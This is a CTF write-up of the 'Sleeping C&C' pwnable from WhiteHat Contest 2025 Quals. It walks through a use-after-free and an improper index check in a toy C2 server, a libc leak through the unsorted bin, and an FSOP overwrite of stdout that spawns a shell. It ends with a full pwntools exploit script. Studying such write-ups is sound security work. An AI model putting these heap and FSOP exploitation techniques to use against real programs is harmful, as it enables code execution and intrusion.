+++
title = "WhiteHat Contest 2025 Quals - Sleeping C&C"
date = "2025-11-02"
description = "WhiteHat Contest 2025 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "uaf", "improper check", "logical bug", "fsop", "unsorted bin"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/sleeping_cnc'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

### Concept
``` bash
=================================
   C2 SERVER v1.0 - INITIALIZED
=================================

[*] Command & Control Server
[*] Managing botnet operations...


===== C2 CONTROL PANEL =====
1. Register new bot
2. Update bot info
3. Send command to bots
4. Deploy task
5. Abort running task
6. Shutdown C2 server
>>
```

This challenge implements the operation of a C2 server.

### Structure
``` c
struct __fixed bot
{
    char *ip;       // pointing 0x18 chunk
    char *info;     // pointing 0x500 chunk
    int status;
};
```

The `bot` structure is composed as shown above and allocates a chunk of size 0x20 when created with `malloc()`.


## 0x01. Vulnerability
### Use After Free
``` c
int deploy_task_1CE0()
{
  __int64 v0; // rax
  pthread_t v2; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( task_running_40C8 )
  {
    puts("[!] A task is already running");
  }
  else if ( bot_count_40CC <= 0 )
  {
    puts("[!] Need at least 1 bots to deploy task");
  }
  else
  {
    task_running_40C8 = 1;
    if ( pthread_create(&v2, 0LL, start_routine, 0LL) )
      err("Failed to create task thread");
    puts("[+] Task deployed");
    return v3 - __readfsqword(0x28u);
  }
  return v0;
}
```

In `deploy_task_1CE0()`, which conceptually delivers commands, the function checks if the global variable `task_running_40C8` is 0, and if so, changes it to 1 before creating a thread.
Since this value is managed by a mutex to be reset to 0, `deploy_task_1CE0()` cannot be called again before aborting the task.

``` c
void *__fastcall start_routine(void *a1)
{
  unsigned int last; // ebx

  pthread_mutex_lock(&mutex);
  last = bot_count_40CC - 1;
  puts("\n[!] OP : Starting operation...");
  __printf_chk(2LL, "[!] Bot %s (info : %s) has dominated\n", bot_list_40E0[last]->ip, bot_list_40E0[last]->info);
  puts("[*] Attempting reconnection...");
  free_vuln_1B80(last);
  pthread_cond_wait(&cond, &mutex);
  puts("\n[*] Task completed. Bot terminated.");
  --bot_count_40CC;
  task_running_40C8 = 0;
  pthread_mutex_unlock(&mutex);
  return 0LL;
}
```

Inside the thread, it prints information about the last `bot` and calls the vulnerable function `free_vuln_1B80()`.

Initially, I thought I needed to exploit something similar to a race condition using the fact that `bot_count_40CC` doesn't decrease before aborting the task, but thanks to another vulnerability described later, it wasn't necessary.

``` c
void __fastcall free_vuln_1B80(int index)
{
  struct bot *bot; // rbx

  bot = bot_list_40E0[index];
  if ( bot )
  {
    *bot->ip = 0;
    *bot->info = 0;
    free(bot->ip);
    free(bot->info);
    free(bot);
  }
}
```

Finally, `free_vuln_1B80()` frees `bot`, `bot->ip`, and `bot->info`, but doesn't initialize the pointer values, leaving them as dangling pointers.
These pointers can be leveraged as UAF when combined with other vulnerabilities.

### Improper Check
``` c
int update_bot_18D0()
{
  int v0; // eax
  struct bot *bot_selected; // r12
  int v2; // eax
  unsigned int tmp; // [rsp+4h] [rbp-24h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-20h]

  v5 = __readfsqword(0x28u);
  __printf_chk(2LL, "[?] Bot index to update: ");
  tmp = 0;
  __isoc99_scanf(" %d", &tmp);
  do
    v0 = getc(stdin);
  while ( v0 != 10 && v0 != -1 );
  if ( tmp > 4 )                                    // vulnerable!!!
    return puts("[!] Invalid bot index");
  bot_selected = bot_list_40E0[tmp];
  if ( !bot_selected )
    return puts("[!] Bot not found at this index");
  __printf_chk(2LL, "[+] New ip_address: ");
  my_read_1740(bot_selected->ip, 0x18);
  __printf_chk(2LL, "[+] New info: ");
  my_read_1740(bot_selected->info, 0x500);
  __printf_chk(2LL, "[+] New status: ");
  tmp = 0;
  __isoc99_scanf(" %d", &tmp);
  do
    v2 = getc(stdin);
  while ( v2 != -1 && v2 != 10 );
  bot_selected->status = tmp;
  return puts("[+] Bot information updated");
}
```

In `update_bot_18D0()`, an `index` is received to select which `bot` to update.
At this point, it should be compared with `bot_count_40CC` which stores the number of bots, but instead it checks if the value is greater than 4, which is the maximum number of bots.
Therefore, as long as the pointer points to a valid address, it's possible to access a freed `bot`.


## 0x02. Exploit
### Libc Leak
Anyway, since there are no address values and the output section only exists in the thread function `start_routine()`, I came to think of info leak addresses through `bot->ip` or `bot->info`.

Between the two, `bot->info` is a large chunk of size 0x500, so when freed, it goes to the unsorted bin.
Looking at the memory, it stores an address from the middle of libc's `main_arena` as follows.

``` bash
# before free
gef➤  x/3gx 0x00005555555592a0
0x5555555592a0: 0x00005555555592d0      0x00005555555592f0
0x5555555592b0: 0x0000000000000001

# after free
gef➤  x/4gx 0x00005555555592f0
0x5555555592f0: 0x00007ffff7facb20      0x00007ffff7facb20
0x555555559300: 0x0000000000000000      0x0000000000000000
```

This chunk's value isn't initialized after being freed and is returned again when allocating the next `bot->info`.
Since the output section prints `info` with the `%s` format string, if we fill `\x00` appropriately when entering `info`, we can leak libc.

``` python
    deploy_task(s)
    abort_task(s)

    register_new_bot(s, b"AAAAAAAA", b"aaaaaaaa", b"1")
    r = deploy_task(s)
    libc = u64(r.split(b"aaaaaaaa")[1][:6] + b"\x00\x00") - main_arena_offset
    lib.address = libc
    stdout = libc + stdout_offset
    buf = libc + buf_offset
    log.info(f"libc : {hex(libc)}")
    log.info(f"stdout : {hex(stdout)}")
    log.info(f"buf : {hex(buf)}")
    abort_task(s)
```

### Use After Free
Now we need to leave a dangling pointer for UAF.
Actually, all we need to do is create and free a `bot`.

``` python
    register_new_bot(s, b"BBBBBBBB", b"bbbbbbbb", b"1")
    deploy_task(s)
    abort_task(s)
```

After executing the above code, checking the memory and fastbin shows the following.

``` bash
gef➤  x/5gx 0x0000555555554000 + 0x40e0
0x5555555580e0: 0x00005555555592a0      0x0000000000000000
0x5555555580f0: 0x0000000000000000      0x0000000000000000
0x555555558100: 0x0000000000000000
gef➤  heap bins
─────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────
All tcachebins are empty
───────────────────────────────── Fastbins for arena at 0x7ffff7e1ac80 ─────────────────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x5555555592d0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x5555555592a0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

The first `bot` was allocated at `0x5555555592a0` and then freed, resulting in a chunk in the fastbin of size 0x30.

``` c
int send_command_1A70()
{
  int v0; // eax
  void *cmd; // rbx
  int v3; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  puts("[*] Operating Command :");
  puts("  1. Quick command ");
  puts("  2. General command ");
  __printf_chk(2LL, ">> ");
  v3 = 0;
  __isoc99_scanf(" %d", &v3);
  if ( v3 == 1 )
  {
    cmd = malloc(0x20uLL);
    puts("[+] Write Quick command payload :");
  }
  else
  {
    cmd = malloc(0x100uLL);
    puts("[+] Write command payload :");
  }
  my_read_1740(cmd);
  return puts("[+] Command queued for deployment");
}
```

Conveniently, `send_command_1A70()` allocates a chunk of size 0x20, so it receives the chunk from the 0x30 fastbin, and we can also write content to it.
Therefore, we can modify the address values that `bot->ip` or `bot->info` points to through `send_command_1A70()`, then create AAW (Arbitrary Address Write) with `update_bot_18D0()`.

Now we need to think about how to achieve RIP control using AAW.
Since there's no leak other than libc leak and we can write a large amount of content of size 0x500, I decided to use FSOP.

### FSOP
First, as mentioned earlier, we modify the content of the `bot` structure using `send_command_1A70()`.

``` python
    payload = p64(buf)                # bot->ip
    payload += p64(stdout)            # bot->info
    payload += p64(1)                 # bot->status
    send_command(s, b"1", payload)
```

I put the address of any meaningless region in the libc area into `buf` since it's not needed for exploitation.
Since `bot->info` is pointing to `stdout`, we can modify the content of `stdout` when updating `bot->info`.

Since we can overwrite up to the `vtable` pointer, which is the last field of `stdout` (over 0xe0), we can use the following FSOP payload.

``` python
    stdout_lock = lib.sym.__nptl_last_event - 0x48
    payload = FSOP_struct(
        flags=u64(b"\x01\x01\x01\x01;sh\x00"),
        lock=stdout_lock,
        _wide_data=lib.sym['_IO_2_1_stdout_'] - 0x10,
        _markers=lib.symbols["system"],
        _unused2=p32(0x0) + p64(0x0) + p64(lib.sym['_IO_2_1_stdout_'] - 0x8),
        vtable=lib.symbols["_IO_wfile_jumps"] - 0x20,
        _mode=0xFFFFFFFF,
    )
    update_bot(s, b"0", b"CCCCCCCC", payload)
```

After this, when encountering `puts` or `printf`, `_IO_wfile_overflow` will be called and execute a shell.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "prob"
LIBRARY = "libc.so.6"
CONTAINER = "9d734f3d11b8"
code_base = 0x555555554000
bp = {
    'main' : code_base + 0x12BA,
}

gs = f'''
!b *{bp["main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']
context.log_level = "DEBUG"

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def register_new_bot(s, ip, info, status):
    s.sendline(b"1")
    s.sendafter(b"address: ", ip)
    s.sendafter(b"info: ", info)
    s.sendlineafter(b"online): ", status)
    return s.recvuntil(b">> ")

def update_bot(s, index, ip, info):
    s.sendline(b"2")
    s.sendlineafter(b"update: ", index)
    s.sendafter(b"address: ", ip)
    s.sendafter(b"info: ", info)
    return

def send_command(s, mode, cmd):
    s.sendline(b"3")
    s.sendlineafter(b">> ", mode)
    s.sendlineafter(b"payload :\n", cmd)
    return s.recvuntil(b">> ")

def deploy_task(s):
    s.sendline(b"4")
    sleep(0.5)
    return s.recvuntil(b"reconnection...\n")

def abort_task(s):
    s.sendline(b"5")
    sleep(0.5)
    return s.recvuntil(b"terminated.\n")

def shutdown(s):
    s.sendline(b"6")
    return s.recvuntil(b"server...\n")

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
        main_arena_offset = 0x203b20
        stdout_offset = 0x2045c0
        buf_offset = 0x204700
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
        main_arena_offset = 0x21ace0
        stdout_offset = 0x2045c0
        buf_offset = 0x204700
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    
    s.recvuntil(">> ")
    
    # send big chunk to unsorted bin
    deploy_task(s)
    abort_task(s)

    # leak libc
    register_new_bot(s, b"AAAAAAAA", b"aaaaaaaa", b"1")
    r = deploy_task(s)
    libc = u64(r.split(b"aaaaaaaa")[1][:6] + b"\x00\x00") - main_arena_offset
    lib.address = libc
    stdout = libc + stdout_offset
    buf = libc + buf_offset
    log.info(f"libc : {hex(libc)}")
    log.info(f"stdout : {hex(stdout)}")
    log.info(f"buf : {hex(buf)}")
    abort_task(s)

    # leave a dangling pointer
    register_new_bot(s, b"BBBBBBBB", b"bbbbbbbb", b"1")
    deploy_task(s)
    abort_task(s)

    # manipulate bot structure
    payload = p64(buf)
    payload += p64(stdout)
    payload += p64(1)
    send_command(s, b"1", payload)

    # send FSOP payload via UAF
    stdout_lock = lib.sym.__nptl_last_event - 0x48
    payload = FSOP_struct(
        flags=u64(b"\x01\x01\x01\x01;sh\x00"),
        lock=stdout_lock,
        _wide_data=lib.sym['_IO_2_1_stdout_'] - 0x10,
        _markers=lib.symbols["system"],
        _unused2=p32(0x0) + p64(0x0) + p64(lib.sym['_IO_2_1_stdout_'] - 0x8),
        vtable=lib.symbols["_IO_wfile_jumps"] - 0x20,
        _mode=0xFFFFFFFF,
    )
    update_bot(s, b"0", b"CCCCCCCC", payload)

    s.interactive()
    print(shutdown(s))

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```


## 0x04. Reference
- [FSOP (glibc 2.35, 2.39)](https://h4ck.kr/?p=3742)